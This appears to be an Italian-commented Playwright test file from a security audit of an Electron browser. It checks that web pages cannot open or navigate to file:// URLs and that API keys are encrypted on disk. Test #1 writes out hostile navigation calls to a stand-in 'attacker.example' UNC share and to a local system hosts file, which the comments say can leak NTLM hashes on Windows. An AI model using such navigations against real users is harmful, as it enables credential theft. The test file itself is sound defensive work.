// Verifiche di sicurezza (audit giugno 2026):
//   #1 — una pagina web non può far navigare il browser verso file:// (su
//        Windows un percorso UNC fa trapelare l'hash NTLM) né altri schemi
//        non-web via window.open / window.location.
//   #3 — le chiavi API (settings.apiKeys) sono cifrate a riposo nel storage.json
//        (mai in chiaro su disco), pur restando in chiaro in memoria per chi
//        legge i settings.
//
// Gli assert affermano il SUCCESSO della difesa: senza i fix questi test
// diventano rossi (compare un tab file://, oppure la chiave appare in chiaro
// nel file su disco).

import { test, expect } from './fixtures/electron.mjs';
import { readFileSync } from 'node:fs';
import { join } from 'node:path';

test('#1 una pagina web non può aprire file:// (window.open) né navigarci (location)', async ({ app, openTab, testServer }) => {
  const page = await testServer.openReady(openTab, `
    <!doctype html><meta charset="utf-8"><title>nav-block</title>
    <body><p>pagina di test</p></body>
  `);
  const startUrl = page.url();
  expect(startUrl.startsWith('http://')).toBe(true);

  // a) window.open verso file:// → setWindowOpenHandler deve negare (nessun tab).
  await page.evaluate(() => {
    try { window.open('file:///C:/Windows/System32/drivers/etc/hosts'); } catch (_) {}
    try { window.open('file://attacker.example/share/x'); } catch (_) {}
  });
  // b) window.location verso file:// → will-navigate deve fare preventDefault.
  await page.evaluate(() => {
    try { window.location.href = 'file://attacker.example/share/y'; } catch (_) {}
  });

  // Diamo tempo a un'eventuale (indesiderata) navigazione/apertura di propagarsi.
  await new Promise((r) => setTimeout(r, 800));

  // Nessuna finestra/tab deve essere finita su uno schema file:.
  const fileWindows = app.windows().filter((w) => {
    try { return w.url().toLowerCase().startsWith('file:'); } catch (_) { return false; }
  });
  expect(fileWindows.length).toBe(0);

  // La pagina di partenza è rimasta sul suo URL http (non è stata dirottata).
  expect(page.url()).toBe(startUrl);
});

test('#3 le chiavi API sono cifrate nel storage.json (mai in chiaro su disco)', async ({ app }) => {
  const SECRET = 'sk-or-v1-SEGRETISSIMA-' + Date.now();
  const userData = await app.evaluate(() => process.env.FILO_USER_DATA);
  const canEncrypt = await app.evaluate(({ safeStorage }) => {
    try { return safeStorage.isEncryptionAvailable(); } catch (_) { return false; }
  });

  // Scrive una apiKey reale e forza la scrittura sincrona su disco.
  await app.evaluate(async (secret) => {
    const S = globalThis.__filoStorage;
    await S.set({ settings: { apiKeys: { openrouter: secret }, theme: 'auto' } });
    S.flushSync();
  }, SECRET);

  const raw = readFileSync(join(userData, 'storage.json'), 'utf8');
  const onDisk = JSON.parse(raw);

  // In MEMORIA la chiave resta leggibile in chiaro (chi legge i settings non cambia).
  const memKey = await app.evaluate(async () => {
    const got = await globalThis.__filoStorage.get('settings');
    return got.settings && got.settings.apiKeys && got.settings.apiKeys.openrouter;
  });
  expect(memKey).toBe(SECRET);

  if (canEncrypt) {
    // Su disco: niente segreto in chiaro, e il blob cifrato presente.
    expect(raw).not.toContain(SECRET);
    expect(onDisk.settings.apiKeys).toBeFalsy();
    expect(String(onDisk.settings.apiKeysEnc || '')).toContain('safeStorage:v1:');
  } else {
    // Senza keyring OS (es. Linux headless): fallback in chiaro, nessuna perdita
    // di dati. Lo dichiariamo esplicitamente invece di fingere una verifica.
    expect(onDisk.settings.apiKeys.openrouter).toBe(SECRET);
    test.info().annotations.push({ type: 'note', description: 'safeStorage non disponibile: cifratura a riposo non verificata su questo ambiente' });
  }
});
